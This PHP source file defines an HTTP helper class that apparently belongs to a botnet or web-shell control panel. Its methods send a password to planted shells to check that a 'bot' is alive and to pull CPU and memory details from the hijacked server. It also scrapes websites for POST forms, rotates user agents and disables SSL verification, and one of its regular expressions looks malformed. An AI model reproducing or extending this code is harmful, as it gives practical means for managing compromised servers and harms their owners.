<?php

require_once("./utilities.php");

class http extends utilities {

	public function check_bot($url, $pass){
		$request = $this->curl_request($url, "pass=".$pass."&check=true", $this->random_user_agent(), 3, false);
		if($request == "OK"){
			return true;
		}else{
			return false;
		}
	}
	
	public function get_os_info($shell_url, $pass){
		$request = $this->curl_request($shell_url, "pass=".$pass."&get_server_info=true", $this->random_user_agent(), 6, false);
		$info_array = json_decode($request, true);
		if(isset($info_array['CPU_INFO']) || isset($info_array['MEMORY_INFO'])){
			$info_array['CPU_INFO'] = $this->arrange_info_linux($info_array['CPU_INFO']);
			$info_array['MEMORY_INFO'] = $this->arrange_info_linux($info_array['MEMORY_INFO']);
		}
		unset($info_array[0]);
		unset($info_array[1]);
		return $info_array;
	}
	
	public function find_post_form($website){
		$request = $this->curl_request($website, "", $this->random_user_agent(), 4, false);
		if(preg_match_all('//action=[\"|\'](.*?)[\"|\'].*post//', $request, $output)){
			$choose = $output[rand(0, (count($output)-1))];
			if($choose[0] != "/"){ $choose = "/".$choose; }
			$combine = $website.$choose;
			return $combine;
		}elseif(preg_match_all('/<form.*post/', $request, $output)){
			return $website;
		}
	}
	
	public function check_url($url){
		$ch=curl_init();
		curl_setopt($ch,CURLOPT_URL,$url );
		curl_setopt($ch,CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch,CURLOPT_VERBOSE,false);
		curl_setopt($ch,CURLOPT_TIMEOUT, 1);
		curl_setopt($ch,CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch,CURLOPT_SSLVERSION,3);
		curl_setopt($ch,CURLOPT_SSL_VERIFYHOST, FALSE);
		$page=curl_exec($ch);
		$httpcode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
		curl_close($ch);
		if($httpcode>=200 && $httpcode<402) return true;
		else return false;
	}
	
	public function curl_request($url, $post = "", $user_agent = "", $timeout = 5, $header = true){
		$ch = @curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		curl_setopt($ch, CURLOPT_HEADER, $header);
		if($user_agent){
			curl_setopt($ch, CURLOPT_USERAGENT, $user_agent);
		}
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		if($post){
			curl_setopt($ch, CURLOPT_POST, 1);
			curl_setopt($ch, CURLOPT_POSTFIELDS, $post); 
		}
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE); 
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch, CURLOPT_TIMEOUT, $timeout); 
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
		$page = curl_exec( $ch);
		curl_close($ch); 
		return $page;
	}
	
	public function multi_curl_request($data, $timeout = 5, $options = array()){
		$curly = array();
		$result = array();
		$mh = curl_multi_init();
		foreach($data as $id => $d) {
			$curly[$id] = curl_init();
			$url = (is_array($d) && !empty($d['url'])) ? $d['url'] : $d;
			curl_setopt($curly[$id], CURLOPT_URL, $url);
			curl_setopt($curly[$id], CURLOPT_HEADER, 0);
			curl_setopt($curly[$id], CURLOPT_RETURNTRANSFER, 1);
			if (is_array($d)) {
				if (!empty($d['post'])) {
					curl_setopt($curly[$id], CURLOPT_POST, 1);
					curl_setopt($curly[$id], CURLOPT_POSTFIELDS, $d['post']);
				}
			}
			curl_setopt($curly[$id],CURLOPT_TIMEOUT, $timeout);
			if (!empty($options)) {
				curl_setopt_array($curly[$id], $options);
			}
			curl_multi_add_handle($mh, $curly[$id]);
		}
		$running = null;
		do {
			curl_multi_exec($mh, $running);
		}
		while ($running > 0);
		foreach($curly as $id => $c) {
			$result[$id] = curl_multi_getcontent($c);
			curl_multi_remove_handle($mh, $c);
		}
		curl_multi_close($mh);
		return $result;
	}
}


?>